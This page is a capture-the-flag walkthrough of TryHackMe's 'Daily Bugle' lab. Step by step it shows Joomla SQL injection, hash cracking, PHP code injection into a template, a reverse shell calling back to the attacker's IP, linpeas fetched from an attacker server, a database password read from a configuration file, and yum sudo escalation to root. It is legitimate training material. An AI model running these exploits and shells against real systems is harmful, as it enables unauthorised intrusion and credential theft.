---
layout: page
title: Daily Bugle
description: Daily Bugle from TryHackMe.
img: 
importance: 2
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bugle/logo.png" title="THM Daily Bugle Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/dailybugle">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Welcome to the Daily Bugle.  We will get the scoop on Spidey.

Run nmap to get a list of the services running.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.167.104
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 23:44 AEDT
Nmap scan report for 10.10.167.104
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Aggressive OS guesses: Linux 4.4 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (96%), Linux 4.15 (96%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   9.80 ms   10.4.0.1
2   ... 3
4   260.67 ms 10.10.167.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.15 seconds
```
{% endraw %}

<br />
Run the vuln category of nmap scripts hoping to find low-hanging fruit...and a vulnerability we can exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ sudo nmap --script vuln -oN vulnchk 10.10.167.104
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 23:44 AEDT
Nmap scan report for 10.10.167.104
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
| http-vuln-cve2017-8917: 
|   VULNERABLE:
|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
|       to execute aribitrary SQL commands via unspecified vectors.
|       
|     Disclosure date: 2017-05-17
|     Extra information:
|       User: root@localhost
|     References:
|       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917

<snip>
```
{% endraw %}

<br />
Check the Landing Page of the website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for a script to exploit the SQL injection exploit listed in the nmap vulnerability output.  

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/script.png" title="SQLi Script" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py">https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py</a>

<br />
Download the exploit to our local working folder.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/refs/heads/master/joomblah.py
--2025-02-19 00:11:58--  https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/refs/heads/master/joomblah.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 2606:50c0:8001::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6040 (5.9K) [text/plain]
Saving to: ‘joomblah.py’

joomblah.py                                                100%[========================================================================================================================================>]   5.90K  --.-KB/s    in 0.002s  

2025-02-19 00:11:59 (3.75 MB/s) - ‘joomblah.py’ saved [6040/6040]
```
{% endraw %}

<br />
Run the python script to dump the users table.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ python joomblah.py http://10.10.167.104
/home/kali/Documents/thm/bugle/joomblah.py:160: SyntaxWarning: invalid escape sequence '\ '
  logo = """
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```
{% endraw %}

<br />
Create a file containing the hash so we can pass it to john the ripper.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (jonah)     
1g 0:00:05:44 DONE (2025-02-19 00:38) 0.002902g/s 135.9p/s 135.9c/s 135.9C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
Authenticate into the /administrator/ section with the creds we just extracted.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try to SSH with the credentials, maybe we will get lucky.  Nope!

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ ssh james@10.10.167.104                       
james@10.10.167.104's password: 
Permission denied, please try again.
james@10.10.167.104's password:
```
{% endraw %}

<br />
Perform more research about the vulnerabilities associated with Joomla.  Apperently, we can abuse the template section.  So from the Extensions menu, rollover Templates, and Select Templates.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/templates.png" title="Templates" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download Pentest Monkey's PHP reverse shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
--2025-02-19 00:54:47--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 2606:50c0:8000::154, 2606:50c0:8002::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0.003s  

2025-02-19 00:54:47 (1.76 MB/s) - ‘shell.php’ saved [5491/5491]
```
{% endraw %}

<br />
Update the IP and port in the script to whatever you are going to use as your lhost and lport.

{% raw %}
```php
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ cat shell.php               
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.4.119.29';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>
```
{% endraw %}

<br />
Click on the New File button.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/newfile.png" title="Click New File" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Don't monkey about and choose the Pentest Monkey's file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/monkey.png" title="Choose File" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Upload the file and notice the big error message indicating that the upload file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/error.png" title="Error" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Giving it a think, one of the common ways I like to pop Wordpress is injecting php into themes.  Twenty-sixteen 404.php for the win!  Let's see if we can't do something similar with templates.  We can add a small system line into the error.php file in the beez3 template.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/inject.png" title="Inject" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
We can pass ls to the cmd parameter to test the RCE.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/testrce.png" title="Test RCE" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get a one-liner from the trusty revshells.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Paste the exploit one-line into the cmd paramter end execute.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/exploit.png" title="Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.167.104] 60952
id
uid=48(apache) gid=48(apache) groups=48(apache)
python -c 'import pty; pty.spawn("/bin/bash");'
bash-4.2$
```
{% endraw %}

<br />
Download linpeas.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
--2025-02-19 01:16:25--  https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/fb023db6-ffeb-4579-9efa-20dcaf35eac7?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250218%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250218T141629Z&X-Amz-Expires=300&X-Amz-Signature=0efe0201dbac8598e70b197f3a0c2ee23486d8d75c44686a37f56b03fc4236e6&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-02-19 01:16:25--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/fb023db6-ffeb-4579-9efa-20dcaf35eac7?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250218%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250218T141629Z&X-Amz-Expires=300&X-Amz-Signature=0efe0201dbac8598e70b197f3a0c2ee23486d8d75c44686a37f56b03fc4236e6&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 820.39K  3.05MB/s    in 0.3s    

2025-02-19 01:16:26 (3.05 MB/s) - ‘linpeas.sh’ saved [840082/840082]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ python -m 'http.server'         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer linpeas.sh to the victim machine.

{% raw %}
```bash
bash-4.2$ wget 10.4.119.29:8000/linpeas.sh
wget 10.4.119.29:8000/linpeas.sh
--2025-02-18 09:17:31--  http://10.4.119.29:8000/linpeas.sh
Connecting to 10.4.119.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: 'linpeas.sh'

100%[======================================>] 840,082      418KB/s   in 2.0s   

2025-02-18 09:17:34 (418 KB/s) - 'linpeas.sh' saved [840082/840082]

bash-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
```
{% endraw %}

<br />
Run the linpeas.sh script.

{% raw %}
```bash
bash-4.2$ ./linpeas.sh
./linpeas.sh

<snip>

╔══════════╣ Searching passwords in config PHP files
/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu';                                                                                                                                                              
/var/www/html/libraries/joomla/log/logger/database.php:                 $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];
/var/www/html/libraries/joomla/log/logger/database.php:                 $this->password = null;
/var/www/html/libraries/joomla/log/logger/database.php:                 'password' => $this->password,

<snip>
```
{% endraw %}

<br />
From the results of the peas, there appears to be a juicy configuration file.

{% raw %}
```bash
[jjameson@dailybugle beez3]$ cat /var/www/html/configuration.php
cat /var/www/html/configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';

<snip>
```
{% endraw %}

Use the password from the configuration file to su into the jjameson user.

{% raw %}
```bash
<bash-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu

[jjameson@dailybugle beez3]$
```
{% endraw %}

<br />
SSH into the machine just so we can get a better shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ ssh jjameson@10.10.167.104                  
jjameson@10.10.167.104's password: 
Last login: Tue Feb 18 09:26:04 2025
[jjameson@dailybugle ~]$
```
{% endraw %}

<br />
Run sudo -l to get a list of commands that our user can run as sudo.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bugle]
└─$ ssh jjameson@10.10.167.104                  
jjameson@10.10.167.104's password: 
Last login: Tue Feb 18 09:26:04 2025
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
{% endraw %}

<br />
Check the GTFOBins for the yum.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bugle/gtfobins.png" title="GTFO Bins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Follow the steps in the GTFO Bins to escalate to root.

{% raw %}
```bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Failed to set locale, defaulting to C
Loaded plugins: y
No plugin match for: y
sh-4.2#
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
sh-4.2# cat /root/root.txt
<redacted>
sh-4.2# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:17:f9:e3:8c:35 brd ff:ff:ff:ff:ff:ff
    inet 10.10.167.104/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2222sec preferred_lft 2222sec
    inet6 fe80::17:f9ff:fee3:8c35/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
sh-4.2# cat /home/jjameson/user.txt
<redacted>
sh-4.2# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:17:f9:e3:8c:35 brd ff:ff:ff:ff:ff:ff
    inet 10.10.167.104/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2182sec preferred_lft 2182sec
    inet6 fe80::17:f9ff:fee3:8c35/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}